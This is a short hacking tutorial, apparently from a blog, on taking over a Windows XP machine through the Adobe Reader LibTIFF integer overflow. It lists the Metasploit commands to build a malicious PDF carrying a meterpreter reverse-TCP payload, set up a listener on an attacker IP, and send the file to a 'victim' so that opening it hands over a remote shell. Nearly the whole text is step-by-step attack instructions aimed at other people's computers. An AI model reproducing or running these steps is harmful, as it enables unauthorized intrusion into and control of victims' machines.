Hack Windows XP using Adobe Acrobat Bundled LibTIFF Integer Overflow

This module exploits integer overflow vulnerability in Adobe Reader and Adobe Acrobat Professional versions 8.0 through 8.2 and 9.0 through 9.3.
Adobe Reader v8.1.1
Adobe Reader v9.3.0
Attacker: Backtrack 5
Victim PC: Windows XP
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/adobe_libtiff
Msf exploit (adobe_libtiff)>set payload windows/meterpreter/reverse_tcp
Msf exploit (adobe_libtiff)>set lhost 192.168.1.4 (IP of Local Host)
Msf exploit (adobe_libtiff)>exploit

After we successfully generate the malicious PDF, it will stored on your local computer
/root/.msf4/local/msf.pdf

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.4
exploit 
Now send your msf.pdf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
